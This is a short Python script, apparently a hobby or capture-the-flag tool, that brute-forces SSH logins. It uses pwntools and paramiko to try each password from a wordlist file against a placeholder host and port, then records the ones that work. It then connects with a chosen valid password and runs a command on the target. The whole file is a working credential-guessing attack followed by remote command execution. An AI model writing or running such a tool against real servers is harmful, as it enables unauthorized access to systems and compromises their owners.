#!/env/bin/python
from pwn import *
import paramiko
hostname="x.x.x.x"
username="example"
attempts=0
ssh_port="9999"
Dictonary = {}
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open("File","r") as password_list:
    for passwd in password_list:
        passwd = passwd.strip("\n")
        try:
            print("[{}] Attempting Password : {}".format(attempts,passwd))
            response = ssh(host=hostname,user=username, password=passwd,timeout=1,port=ssh_port)
            if response.connected():
                print("[>] Valid Password Found: '{}'!".format(passwd))
                Dictonary[str(attempts)] = passwd
                response.close()
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!") 
        attempts += 1
    
    for passwd_valid in Dictonary:
        print(f"The position {passwd_valid} has the password {Dictonary[passwd_valid]} \n")    

    user_choice = input("which connection would you like to do? Choose an option (the number)") 
    try:
        command = "define" #This was used in testing phase to get information from Target
        client.connect(hostname=hostname,username=username,password=Dictonary[user_choice],port=ssh_port)     
        (stdin,stdout,stderr)=client.exec_command(command)
        cmd_output=stdout.read()
        print("log printing:",command,cmd_output)
    except:
        print("Probably the data that was not correct its the password")
    finally:
        client.close()
